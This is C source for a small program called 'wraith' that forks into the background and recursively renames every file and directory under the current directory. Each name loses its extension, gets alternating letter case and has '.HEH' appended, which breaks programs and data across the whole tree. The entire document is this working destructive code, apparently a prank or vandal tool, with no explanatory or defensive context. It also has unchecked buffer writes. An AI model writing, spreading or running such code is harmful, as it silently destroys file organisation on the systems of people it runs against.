/* wraith.c coded by fred_ */

#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>

char *c_file(char *filename)
{
	int x, i;
	static char buffer[256];

	if (strstr(filename, ".") != NULL) {
		for (x = 0; filename[x]; x++) {
			if (filename[x] == '.')
				break;

			buffer[x] = filename[x];
		  }
		buffer[x] = 0;
	  } else
		strcpy((char *)buffer, filename);

	for (x = 0, i = 1; buffer[x]; x++) {
		if (i == 1) {
			buffer[x] = toupper(buffer[x]);
			i = 2;
		  } else if (i == 2) {
			buffer[x] = tolower(buffer[x]);
			i = 1;
		  } else
			buffer[x] = buffer[x];
	  }

	x = strlen(buffer);

	buffer[x] = '.';
	buffer[x + 1] = 'H';
	buffer[x + 2] = 'E';
	buffer[x + 3] = 'H';

	return buffer;
}

int
isDir(char *name)
{
	int ret;
	struct stat *status;
	struct stat s[1];

	status = s;

	ret = lstat(name, s);
	if (ret == -1)
		return 0;

	return S_ISDIR(status->st_mode);
}

int
main(int argc, char *argv[])
{
	char *exec;

	if ((exec = (char *)malloc(256)) == NULL) {
		printf("Not enough memory\n");
		exit(1);
	  }

	printf("starting wraith from the current working directory\n");

	#ifndef DEBUG
		printf("launching into the background..\n");
		if (fork())
			exit(1);
	#endif

	if (strstr(argv[0], "/") != NULL) {
		exec = strrchr(argv[0], '/');
		memmove(exec, exec + 1, strlen(exec));
	  } else
		strcpy(exec, argv[0]);

	modify_dir(".", exec);
}

int
modify_dir(char *directory, char *exec) {
        char *buffer, *newfile;
        struct dirent *files;
        DIR *dp;

	if ((buffer = (char *)malloc(256)) == NULL ||
		(newfile = (char *)malloc(256)) == NULL) {
			printf("Not enough memory.\n");
			exit(1);
	  }

	dp = opendir(directory);
	while (1) {
		bzero(buffer, 256);
		bzero(newfile, 256);
		if ((files = readdir(dp)) == NULL)
			break;

		if (!strcmp(files->d_name, ".") ||
			!strcmp(files->d_name, ".."))
				continue;

		strncpy(buffer, files->d_name, 256);

		if (!strcmp(exec, buffer))
			continue;

		if (isDir(buffer) == 1) {
			#ifdef DEBUG
				printf("Changing to directory: %s\n",
					buffer);
			#endif
			if (chdir(buffer) == 0) {
				modify_dir(".", exec);

				#ifdef DEBUG
					printf("Changing to parent directory\n");
				#endif
				if (chdir("..") == -1)
					exit(1);
			  } else
				continue;
		  }

		newfile = c_file(buffer);

		if (strlen(newfile) > 0) {
			#ifdef DEBUG
				printf("Modified %s to %s\n",
					buffer, newfile);
			#endif
			if (rename(buffer, newfile) == -1)
				continue;
		  }
	  }

	closedir(dp);
}
